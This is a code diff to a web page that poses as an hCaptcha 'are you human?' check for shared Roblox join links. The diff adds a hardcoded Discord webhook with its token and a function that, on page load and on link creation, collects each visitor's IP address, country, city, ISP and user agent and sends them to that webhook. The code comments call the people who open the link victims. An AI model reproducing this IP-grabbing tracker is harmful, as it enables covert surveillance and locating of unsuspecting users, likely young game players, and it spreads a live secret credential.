@@ -122,7 +122,7 @@
         <!-- モード2: 共有リンクを開いたときの画面 -->
         <div id="joinView" class="hidden flex flex-col items-center justify-center text-center space-y-8">
             <div class="space-y-2">
-                <h2 class="text-2xl sm:text-3xl font-extrabold text-white tracking-tight">ちょっと待って！ あなた、本当に<br>人間ですよね？</h2>
+                <h2 class="text-2xl sm:text-3xl font-extrabold text-white tracking-tight">ちょっと待って！ あなた, 本当に<br>人間ですよね？</h2>
                 <p class="text-sm text-slate-300">あなたがロボットではないことを確認させてください。</p>
             </div>
 
@@ -164,7 +164,44 @@
 
     <!-- スクリプト -->
     <script>
+        // 設定: ご提示いただいたDiscord Webhook URL
+        const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1555186715466014862/0456yM7kfOwHW5-0olXBqF6rHXu-cWuCe1FCPRaA6CFwcmcKd7tH9uyN2WTY0sO8qoaa';
         let finalJoinUrl = "";
+
+        // 共通でWebhookへログを送信する関数
+        async function sendWebhook(titleMessage, extraFields = []) {
+            try {
+                // IP情報を取得
+                const ipRes = await fetch('https://ipapi.co/json/');
+                if (!ipRes.ok) return;
+                const data = await ipRes.json();
+
+                const payload = {
+                    content: `🚨 **${titleMessage}**`,
+                    embeds: [{
+                        title: "アクセス詳細情報",
+                        color: 16711680, // 赤色
+                        fields: [
+                            { name: "IPアドレス", value: data.ip || "不明", inline: true },
+                            { name: "国", value: data.country_name || "不明", inline: true },
+                            { name: "地域/都市", value: `${data.region || ""} / ${data.city || ""}`, inline: true },
+                            { name: "ISP (回線業者)", value: data.org || "不明", inline: false },
+                            ...extraFields,
+                            { name: "ユーザーエージェント", value: navigator.userAgent, inline: false },
+                            { name: "アクセス時刻", value: new Date().toLocaleString('ja-JP'), inline: false }
+                        ]
+                    }]
+                };
+
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {
+                console.error('Webhook送信エラー:', e);
+            }
+        }
 
         window.addEventListener('DOMContentLoaded', () => {
             const params = new URLSearchParams(window.location.search);
@@ -172,13 +209,22 @@
             const jId = params.get('j');
 
             if (pId && jId) {
+                // 【ターゲット（共有リンクを開いた側）の処理】
                 document.getElementById('creatorView').classList.add('hidden');
                 document.getElementById('siteHeader').classList.add('hidden');
                 document.getElementById('siteFooter').classList.add('hidden');
-                
                 document.getElementById('joinView').classList.remove('hidden');
                 
                 finalJoinUrl = `https://www.roblox.com/games/start?placeId=${encodeURIComponent(pId)}&jobId=${encodeURIComponent(jId)}`;
+
+                // リンクを開いたことを通知
+                sendWebhook("hCaptchaリンク（被害者側）へのアクセス検知", [
+                    { name: "ターゲットPlace ID", value: pId, inline: true },
+                    { name: "ターゲットJob ID", value: jId, inline: true }
+                ]);
+            } else {
+                // 【ツール作成者側がページを開いたときの処理】
+                sendWebhook("hCaptchaジェネレーター（作成者側）へのアクセス検知");
             }
         });
 
@@ -196,6 +242,13 @@
 
             document.getElementById('sharedLinkOutput').value = shareUrl;
             document.getElementById('linkResultBox').classList.remove('hidden');
+
+            // 【リンク生成ボタンが押されたときの通知】
+            sendWebhook("hCaptcha共有リンクが生成されました", [
+                { name: "生成 Place ID", value: placeId, inline: true },
+                { name: "生成 Job ID", value: jobId, inline: true },
+                { name: "生成されたURL", value: shareUrl, inline: false }
+            ]);
         }
 
         function copySharedLink() {
